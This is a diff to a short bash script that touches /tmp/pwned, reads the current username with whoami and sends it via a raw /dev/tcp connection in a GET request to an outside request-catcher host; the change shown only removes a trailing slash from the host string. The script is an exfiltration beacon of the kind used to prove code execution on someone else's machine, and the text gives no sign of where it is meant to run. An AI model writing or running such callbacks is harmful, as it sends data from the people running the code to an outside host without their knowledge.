@@ -1,7 +1,7 @@
 #!/bin/bash
 touch /tmp/pwned
 a=$(whoami)
-host="123.requestcatcher.com/"
+host="123.requestcatcher.com"
 path="/test/pwned?id=$a"
 exec 3<>/dev/tcp/$host/443
 printf 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$path" "$host" >&3
